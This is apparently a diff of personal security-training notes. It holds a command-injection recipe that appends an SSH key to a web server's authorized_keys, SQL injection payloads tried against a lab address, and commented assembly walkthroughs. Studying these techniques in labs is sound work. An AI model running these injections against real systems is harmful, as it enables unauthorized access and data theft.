@@ -16,7 +16,7 @@ lin_ops# firefox                                                                
 NMAP SCRIPTS
   /usr/share/nmap/scripts
 smb-os-discovery
-
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 COMMAND INJECTION
 Begin all new commands with a ;
 UPLOAD SSH KEY TO WEB SERVER:
@@ -27,14 +27,16 @@ UPLOAD SSH KEY TO WEB SERVER:
   ; mkdir /var/www/.ssh                                   #MAKE .ssh directory
   ; echo "COPIED KEY" >> /var/www/.ssh/authorized_keys    #ECHO YOUR KEY INTO THE .ssh DIRECTORY
 
-Directory Traversal VIA
+      ###Directory Traversal VIA###
+
 URL
 FILE SEARCHING
 CALL A FUNCTION USING THE DEV TOOLS CONSOLE ()
 
 
 
-EASY-5STEP SQL INJECTION
+      ###EASY-5STEP SQL INJECTION###
+
   1. Identify Vulnerable Fields
   2. Identify # of Columns w/ Golden Statement
   3. Edit Golden Statement
@@ -46,7 +48,8 @@ tom' OR 1='1
 username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 -> URL....php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271
 
 
-POST METHOD
+          ###POST METHOD###
+
   Ford' OR 1='1                       #DID NOT WORK
   Dodge' OR 1='1                      #DID NOT WORK
   Honda' OR 1='1                      #DID NOT WORK
@@ -59,12 +62,65 @@ POST METHOD
   Audi 'UNION SELECT @@version,2,3,4,5; #            #SQL VERSION
 
 
-GET METHOD USING URL
+         ###GET METHOD USING URL###
+
   http://10.50.35.49/uniondemo.php?Selection=1 OR 1=1                #SELECTION 1 DID NOT WORK
   http://10.50.35.49/uniondemo.php?Selection=2 OR 1=1                #SELECTION 2 DID WORK
   http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
   http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
   http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT% 1,2,@@version      #GETS SQL VERSION
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+          ###REVERSE ENGINEERING###
+main: 
+  mov rax, 16                      //move into rax the value of 16                                      
+  push rax                         //push value of rax (16) onto the stack. stack grows by 8 bytes
+  jmp mem2                         //jump to memory location of mem2
+
+mem1:
+  mov rax, 0                       //move into rax the value of 0
+  ret                              //return value of rax (first return register)(0)
+
+mem2:
+  pop r8                           //pop value from top of the stack (16) into r8, r8 is 16. stack shrinks by 8 bytes
+  cmp rax, r8                      //compare to the value of rax (16) to the value of r8 (16). r8 is subtracted from rax.
+  je mem1                          //zero flag is set from previous operation; values are equal. jmp to mem location of mem1
+----------------------------------------------------------------------------------------------------------------------------
+main:
+  mov rcx, 25                      //move into rcx, the value of 25
+  mov rbx, 62                      //move into rbx, the value of 62
+  jump mem1                        //jump to memory location of mem1
+
+mem1:
+  sub rbx, 40                      //subtract from rbx(62) the value of 40. rbx is now 22
+  mov rsi, rbx                     //move into rsi the value of rbx(22)
+  cmp rcx, rsi                     //compare to rcx(25) the value of rsi(22). rsi is subtracted from rcx. flag is set.
+  jle mem2                         //flag is set. jump to memory location of mem2
+
+mem2:
+  mov rax, 0                       //move into rax the value of 0
+  ret                              //return the value of rax (first return register)(0)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
